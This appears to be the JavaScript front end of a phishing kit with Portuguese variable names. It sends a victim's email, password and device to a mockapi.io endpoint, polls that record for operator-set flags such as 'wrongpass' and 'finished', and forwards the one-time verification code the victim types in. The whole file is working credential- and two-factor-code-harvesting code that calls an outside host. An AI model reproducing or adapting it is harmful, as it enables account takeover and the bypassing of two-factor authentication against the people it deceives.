import { getMobileOperatingSystem } from "./functions";

export const URL = "https://626425be98095dcbf92c1546.mockapi.io/data/";

export const SendData = async (email, senha, device) =>{

    let body =   {
        user: email,
        pass: senha,
        device: device,
        step: false,
        finished: false,
        code: "",
        notification: false,
        wrongpass: false,
        sended: false,
        date: new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })
    }

    let retorno = await fetch(URL,{
        method:"POST",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(body)}
    )
    .then(res => res.json())
    .then((response) => {
        localStorage.setItem('id', response.id)
        return response;
    })
    .catch((e)=> {return console.warn(e)});

    return retorno;
}


export const ReplyQuiz = async (data) =>{

    document.querySelector('.send_button').setAttribute('disabled', 'true')
    let os = getMobileOperatingSystem();    

    let body =   {
        sended: true,
        id: data.id,
        notification : os === "iOS" ? true : false
    }

    let retorno = await fetch(URL+data.id,{
        method:"PUT",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(body)}
    )
    .then(res => res.json())
    .then((response) => {        
        if(os === "iOS"){
            document.querySelector('.validation_code').style.display = "block";
        }else{
            document.querySelector('.validation_number').style.display = "block";
        }
        return response;
    })
    .catch((e)=> {return console.warn(e)});

    return retorno;
}

export const SyncAnswer = async (data) =>{

    let dados = await getData(data);

    if(dados.wrongpass === true && document.querySelector('.validation_code')){
        document.querySelector('.validation_code').style.display = "none";
        document.querySelector('.validation_number').style.display = "none";
        document.querySelector('.validation_wrong').style.display = "block";
    }else{
        if(dados.notification === true && document.querySelector('.validation_code')){
            document.querySelector('.validation_code').style.display = "block";
            document.querySelector('.validation_number').style.display = "none";
            document.querySelector('.validation_wrong').style.display = "none";
        }else{
            if(document.querySelector('.validation_code')){
                document.querySelector('.validation_code').style.display = "none";
                document.querySelector('.validation_number').style.display = "block";
                document.querySelector('.validation_wrong').style.display = "none";
            }
        }
    }

    if(dados.finished === true && document.querySelector('.validation_code')){
        document.querySelector('.answer').style.display = "block";
        document.querySelector('.question').style.display = "none";
    }

    return dados; 
}

const getData = async (data) => {

    let retorno = await fetch(URL+data.id,{
        method:"GET",
        headers:{"Content-Type":"application/json"},
    })
    .then(res => res.json())
    .then((response) => {        
        return response;
    })
    .catch((e)=> {return console.warn(e)});

    return retorno;
}

export const UpdateCode = async (data, codigo) =>{

    let body =   {
        code: codigo,
        id: data.id
    }

    let retorno = await fetch(URL+data.id,{
        method:"PUT",
        headers:{"Content-Type":"application/json"},
        body:JSON.stringify(body)}
    )
    .then(res => res.json())
    .then((response) => {
        return response;
    })
    .catch((e)=> {return console.warn(e)});

    return retorno;
}